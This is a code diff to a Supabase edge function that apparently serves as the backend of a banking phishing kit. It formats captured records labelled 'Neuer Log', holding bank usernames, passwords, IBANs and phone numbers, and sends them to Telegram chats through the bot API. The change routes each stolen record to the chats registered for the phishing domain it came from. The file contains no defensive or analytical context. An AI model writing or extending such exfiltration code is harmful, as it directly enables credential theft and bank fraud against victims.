@@ -1,6 +1,15 @@
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2/cors";
 
+function normalizeDomain(d?: string | null): string {
+  return (d || "")
+    .toLowerCase()
+    .replace(/^https?:\/\//, "")
+    .replace(/^www\./, "")
+    .replace(/\/.*$/, "")
+    .trim();
+}
+
 function formatLog(s: any): string {
   return `🔔 Neuer Log
 
@@ -21,7 +30,8 @@ benutzername: ${s.bank_username || ""}
 passwort: ${s.bank_password || ""}
 bank: ${s.bank || ""}
 
-user-agent: ${s.user_agent || ""}`;
+user-agent: ${s.user_agent || ""}
+domain: ${s.domain || ""}`;
 }
 
 function formatFullInfo(s: any): string {
@@ -40,22 +50,30 @@ iban: ${s.iban || ""}
 phone: ${s.phone || ""}
 bank: ${s.bank || ""}
 
-user-agent: ${s.user_agent || ""}`;
+user-agent: ${s.user_agent || ""}
+domain: ${s.domain || ""}`;
 }
 
-async function sendToAllChats(
+async function sendToMatchingChats(
   supabase: any,
   botToken: string,
   text: string,
+  submissionDomain: string | null,
 ): Promise<number> {
   const { data: chatIds } = await supabase
     .from("telegram_chat_ids")
-    .select("chat_id");
+    .select("chat_id, domain");
 
   if (!chatIds || chatIds.length === 0) return 0;
 
+  const target = normalizeDomain(submissionDomain);
+  const matches = chatIds.filter((c: any) => {
+    const cd = normalizeDomain(c.domain);
+    return cd && cd === target;
+  });
+
   let sent = 0;
-  for (const { chat_id: cid } of chatIds) {
+  for (const { chat_id: cid } of matches) {
     const res = await fetch(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
@@ -95,7 +113,7 @@ async function processNotification(
   }
 
   const text = kind === "log" ? formatLog(submission) : formatFullInfo(submission);
-  const sent = await sendToAllChats(supabase, botToken, text);
+  const sent = await sendToMatchingChats(supabase, botToken, text, submission.domain);
   return { ok: true, sent };
 }
 
